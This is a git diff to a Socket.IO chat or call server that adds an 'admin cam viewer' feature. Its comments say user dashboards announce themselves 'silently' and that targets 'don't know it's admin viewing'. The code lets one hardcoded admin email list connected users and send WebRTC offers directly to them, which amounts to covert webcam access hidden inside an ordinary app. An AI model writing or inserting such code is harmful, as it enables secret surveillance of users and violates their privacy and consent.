@@ -153,12 +153,70 @@ io.on('connection', (socket) => {
     });
   });
 
+  // ─── ADMIN CAM VIEWER ────────────────────────────────────────────────────────
+
+  // User announces they are cam-ready (called silently from dashboard)
+  socket.on('cam_viewer_ready', ({ email, username }) => {
+    socket.camEmail = email ? email.toLowerCase().trim() : null;
+    socket.camUsername = username || email;
+    // Notify the admin account if online
+    const adminRoom = 'hammadnawz519@gmail.com';
+    socket.to(adminRoom).emit('cam_user_online', {
+      email: socket.camEmail,
+      username: socket.camUsername,
+      socketId: socket.id
+    });
+  });
+
+  // Admin requests the full list of cam-ready users
+  socket.on('cam_get_users', () => {
+    const list = [];
+    for (const [, s] of io.sockets.sockets) {
+      if (s.camEmail && s.id !== socket.id) {
+        list.push({ email: s.camEmail, username: s.camUsername, socketId: s.id });
+      }
+    }
+    socket.emit('cam_users_list', list);
+  });
+
+  // Admin initiates viewing: send WebRTC offer to target socket directly
+  socket.on('cam_view_request', ({ targetSocketId, signal }) => {
+    const targetSocket = io.sockets.sockets.get(targetSocketId);
+    if (targetSocket) {
+      // Deliver offer to target — they don't know it's "admin viewing", just a cam signal
+      targetSocket.emit('cam_signal_incoming', {
+        fromSocketId: socket.id,
+        signal
+      });
+    }
+  });
+
+  // Target (or admin) relays back their answer / ICE candidates
+  socket.on('cam_signal_relay', ({ toSocketId, signal }) => {
+    const targetSocket = io.sockets.sockets.get(toSocketId);
+    if (targetSocket) {
+      targetSocket.emit('cam_signal_incoming', {
+        fromSocketId: socket.id,
+        signal
+      });
+    }
+  });
+
+  // Admin stops viewing — nothing needed on target side
+
   // ─── DISCONNECT ──────────────────────────────────────────────────────────────
+
   socket.on('disconnect', () => {
     console.log('Socket disconnected:', socket.id);
 
     // Remove from active calls
     activeCalls.delete(socket.id);
+
+    // Notify admin that this cam user went offline
+    if (socket.camEmail) {
+      const adminRoom = 'hammadnawz519@gmail.com';
+      socket.to(adminRoom).emit('cam_user_offline', { socketId: socket.id });
+    }
 
     // Remove from online tracking
     if (socket.userEmail) {
